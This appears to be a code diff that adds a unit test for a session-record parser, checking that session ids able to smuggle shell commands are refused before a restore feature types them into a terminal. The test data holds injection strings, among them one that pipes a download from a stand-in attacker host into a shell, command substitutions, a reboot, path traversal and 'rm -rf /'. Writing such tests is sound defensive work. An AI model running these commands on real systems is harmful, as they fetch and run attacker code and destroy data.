@@ -220,6 +220,29 @@ describe("parseSessionRecord", () => {
 		expect(round).toEqual(record);
 	});
 
+	it("refuses a session id that could act as more than a name", () => {
+		// Restore types the id into a live shell to resume it. A record
+		// is a file on disk, so anything able to write one could reach
+		// the terminal through it. An id is an identifier or it is not a
+		// record.
+		for (const sessionId of [
+			"x; curl evil.example | sh",
+			"x $(whoami)",
+			"x`id`",
+			"x&&reboot",
+			"../../escape",
+			"x\nrm -rf /",
+			"",
+		]) {
+			expect(
+				parseSessionRecord({
+					...JSON.parse(JSON.stringify(opened())),
+					sessionId,
+				}),
+			).toBeUndefined();
+		}
+	});
+
 	it("refuses a record missing the fields every reader depends on", () => {
 		expect(parseSessionRecord({ sessionId: "sess-1" })).toBeUndefined();
 		expect(parseSessionRecord(null)).toBeUndefined();
